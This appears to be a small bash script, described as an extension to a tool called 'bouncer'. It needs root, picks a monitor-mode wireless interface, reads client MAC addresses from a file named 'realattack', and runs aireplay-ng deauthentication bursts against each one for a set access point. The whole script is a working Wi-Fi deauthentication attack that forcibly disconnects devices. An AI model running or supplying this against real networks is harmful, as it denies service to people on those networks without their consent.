#!/bin/bash
#created: 10/11/2020
#extension to bouncer!
#enforcer relies on timer.sh

if [[ ${UID} -ne 0 ]]; then
exit 1
fi

wlan0=$(ip a | grep mon | head -1 | cut -d ":" -f 2)

MYBSSID="00:00:00:00:00:00"

for mac in $(cat realattack); do  
if [[ $mac = "<" ]]; then
echo ""
elif [[ $mac = "HWaddress" ]]; then
echo ""
elif [[ $mac = "<incomplete>" ]]; then
echo ""
else
echo -e "\e[94m"
sudo aireplay-ng  --deauth 30 -a $MYBSSID -c $mac $wlan0
echo -e "\e[0m"
fi
done
